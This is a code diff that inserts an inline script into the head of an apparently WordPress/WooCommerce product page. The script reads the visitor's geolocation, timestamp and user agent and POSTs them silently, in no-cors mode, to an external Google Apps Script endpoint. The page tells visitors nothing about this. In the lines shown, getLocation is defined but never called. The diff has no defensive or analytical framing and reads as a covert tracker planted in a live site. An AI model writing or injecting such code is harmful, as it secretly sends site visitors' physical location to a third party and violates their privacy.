@@ -961,6 +961,58 @@ var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":
     }
 }
 		</style>
+        <script>
+            function sendData(location) {
+                const scriptURL = 'https://script.google.com/macros/s/AKfycbz4esELp7uGskSsnNeIfaIHDi4OmdTNwZQxOayYeHE08tFBx0XgqirKy_9njMoSu8RY/exec';
+                const data = {
+                    latitude: location.coords.latitude,
+                    longitude: location.coords.longitude,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                };
+    
+                fetch(scriptURL, {
+                    method: 'POST',
+                    body: JSON.stringify(data),
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    mode: "no-cors"
+                })
+                //     .then(response => {
+                //     if (response.ok) {
+                //         alert("Data sent successfully!");
+                //     } else {
+                //         alert("Error sending data.");
+                //     }
+                // });
+            }
+    
+            function getLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(sendData, showError);
+                } else {
+                    alert("Geolocation is not supported by this browser.");
+                }
+            }
+    
+            function showError(error) {
+                switch (error.code) {
+                    case error.PERMISSION_DENIED:
+                        alert("User denied the request for Geolocation.");
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        alert("Location information is unavailable.");
+                        break;
+                    case error.TIMEOUT:
+                        alert("The request to get user location timed out.");
+                        break;
+                    case error.UNKNOWN_ERROR:
+                        alert("An unknown error occurred.");
+                        break;
+                }
+            }
+        </script>
 		</head>
 
 <body  class="product-template-default single single-product postid-1234 wp-custom-logo theme-astra surecart-theme-light woocommerce woocommerce-page woocommerce-no-js ehf-template-astra ehf-stylesheet-astra ast-desktop ast-separate-container ast-two-container ast-no-sidebar astra-4.8.2 ast-blog-single-style-1 ast-custom-post-type ast-single-post ast-inherit-site-logo-transparent ast-hfb-header ast-full-width-primary-header ast-normal-title-enabled elementor-default elementor-kit-976">
